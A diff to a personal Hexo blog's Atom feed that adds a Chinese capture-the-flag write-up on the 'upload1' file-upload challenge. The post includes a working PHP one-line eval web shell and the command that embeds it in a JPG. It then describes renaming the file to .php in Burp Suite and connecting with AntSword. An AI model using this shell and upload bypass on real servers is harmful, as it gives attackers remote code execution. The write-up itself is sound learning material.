@@ -6,7 +6,7 @@
   <link href="http://cxdshibaba.github.io/atom.xml" rel="self"/>
   
   <link href="http://cxdshibaba.github.io/"/>
-  <updated>2022-04-14T08:50:51.575Z</updated>
+  <updated>2022-04-18T13:15:02.589Z</updated>
   <id>http://cxdshibaba.github.io/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>文件上传漏洞</title>
+    <link href="http://cxdshibaba.github.io/2022/04/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://cxdshibaba.github.io/2022/04/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
+    <published>2022-04-18T13:04:49.000Z</published>
+    <updated>2022-04-18T13:15:02.589Z</updated>
+    
+    <content type="html"><![CDATA[<p>攻防世界里的upload1题目，首先查看源代码，发现只能上传jpg格式的文件，尝试使用带有一句话木马的jpg图片。<br>如何准备一句话木马：<br>1、准备任意图片pho.jpg<br>2、准备木马文件hack.php<br><?php @eval($_POST['hack']);?><br>3、利用系统命令，将木马复制到图片文件中，产生图片木马hack.jpg<br>copy pho.jpg/b+hack.php/a hack.jpg<br>将此文件上传，在burpsuite抓包<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/0c198b14cfe5ef3b.png"><br>然后修改文件后缀为php上传<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/4b87c1d34fc509bd.png"><br>这里显示上传成功，接着用蚁剑连接<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/e30b408e9ec8e432.png"><br>这里的地址要对应burpsuite上传的地址，最后成功拿到flag<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/9172616e410dafce.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;攻防世界里的upload1题目，首先查看源代码，发现只能上传jpg格式的文件，尝试使用带有一句话木马的jpg图片。&lt;br&gt;如何准备一句话木马：&lt;br&gt;1、准备任意图片pho.jpg&lt;br&gt;2、准备木马文件hack.php&lt;br&gt;&lt;?php @eval($_POST[&#39;hac</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>序列化与反序列化</title>
@@ -396,26 +416,6 @@ class chybeta{undefined
       
       
     <summary type="html">&lt;p&gt;首先打开Burp Suite，接着开临时项目，接着使用Burp的默认值，接着在Proxy中Open Browser，把要抓包的网址复制到Browser中的网页，接着从&lt;br&gt;HTTP history中找到网址内容&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="http://cxdshibaba.github.io/2021/09/26/hello-world/"/>
-    <id>http://cxdshibaba.github.io/2021/09/26/hello-world/</id>
-    <published>2021-09-26T11:52:59.764Z</published>
-    <updated>2021-09-21T06:03:13.483Z</updated>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
       
     
     
